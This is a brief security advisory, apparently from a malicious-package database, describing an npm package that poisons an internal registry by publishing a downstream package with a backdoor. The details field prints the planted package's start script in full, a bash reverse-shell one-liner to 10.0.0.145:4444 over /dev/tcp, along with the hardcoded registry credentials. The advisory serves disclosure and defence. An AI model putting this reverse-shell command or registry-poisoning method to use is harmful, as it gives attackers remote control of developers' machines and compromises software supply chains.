summary: Registry-poisoning backdoor publishes reverse-shell package to internal npm registry
details: When the exported command() function in index.js is invoked, the package writes a base64-encoded credential file to /tmp/.npmrc_pwn (auth `hackpwn:hackpwn123`), registers user `hackpwn` against an internal Verdaccio-style registry at http://0.0.0.0:4873/, and then publishes a package named `uhclabs_local_check` whose package.json `scripts.start` is `/bin/bash -c "bash -i >& /dev/tcp/10.0.0.145/4444 0>&1"`. Anyone in the internal network who installs and starts the planted package opens a reverse shell to 10.0.0.145:4444. The library has no legitimate reason to publish packages or open TCP shells; this is registry-poisoning combined with a remote-shell backdoor delivered through a downstream package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
